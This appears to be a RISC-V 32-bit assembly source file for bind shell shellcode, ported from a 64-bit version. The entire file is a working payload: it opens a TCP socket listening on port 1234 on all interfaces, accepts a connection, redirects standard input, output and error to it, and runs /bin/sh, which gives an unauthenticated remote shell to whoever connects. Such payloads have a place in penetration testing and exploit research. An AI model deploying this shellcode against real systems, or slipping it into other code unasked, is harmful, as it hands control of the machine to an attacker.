# RISC-V 32-bit bind shell shellcode
# Ported to 32-bit from modexp's RISC-V 64-bit bind shell shellcode:
# https://web.archive.org/web/20230327041655/https://github.com/odzhan/shellcode/commit/d3ee25a6ebcdd21a21d0e6eccc979e45c24a9a1d
# ---
# bcoles

.equ PORT, 1234

.global _start
.section .text

_start:
    addi   sp, sp, -16         # reserve stack space for sockaddr_in

    # s = socket(AF_INET, SOCK_STREAM, IPPROTO_IP);
    li     a7, 198             # SYS_socket
    li     a2, 0               # IPPROTO_IP
    li     a1, 1               # SOCK_STREAM
    li     a0, 2               # AF_INET
    ecall

    # bind(s, &sa, sizeof(sa));
    mv     a3, a0              # a3 = s
    li     a7, 200             # SYS_bind
    li     a2, 16              # sizeof(struct sockaddr_in)

    # sockaddr_in
    li     a4, 2               # sin_family = AF_INET
    sh     a4, 0(sp)           # store at offset 0 (16-bit)
    li     a4, ((PORT & 0xFF) << 8) | (PORT >> 8) # sin_port = htons(PORT)
    sh     a4, 2(sp)           # store at offset 2 (16-bit)
    sw     zero, 4(sp)         # sin_addr = INADDR_ANY (0.0.0.0)
    sw     zero, 8(sp)         # sin_zero[0..3] padding bytes
    sw     zero, 12(sp)        # sin_zero[4..7] padding bytes

    mv     a1, sp              # a1 = &sockaddr_in
    mv     a0, a3              # a0 = socket fd
    ecall

    # listen(s, 1);
    li     a7, 201             # SYS_listen
    li     a1, 1               # backlog = 1
    mv     a0, a3              # a0 = socket fd
    ecall
    
    # r = accept(s, 0, 0);
    li     a7, 202             # SYS_accept
    mv     a2, x0              # addrlen = NULL
    mv     a1, x0              # addr = NULL
    mv     a0, a3              # a0 = socket fd
    ecall

    mv     a4, a0              # a4 = r

    # in this order
    #
    # dup3(s, STDERR_FILENO, 0);
    # dup3(s, STDOUT_FILENO, 0);
    # dup3(s, STDIN_FILENO,  0);
    li     a7, 24              # SYS_dup3
    li     a1, 3               # STDERR_FILENO + 1
c_dup:
    mv     a0, a4
    addi   a1, a1, -1
    ecall
    bne    a1, zero, c_dup

    # execve("/bin/sh", NULL, NULL);
    li      a7, 221            # SYS_execve
    li      t0, 0x6e69622f     # "/bin"
    sw      t0, 0(sp)
    li      t0, 0x0068732f     # "/sh\0"
    sw      t0, 4(sp)
    mv      a0, sp             # path = /bin/sh
    mv      a1, x0             # argv = NULL
    mv      a2, x0             # envp = NULL
    ecall
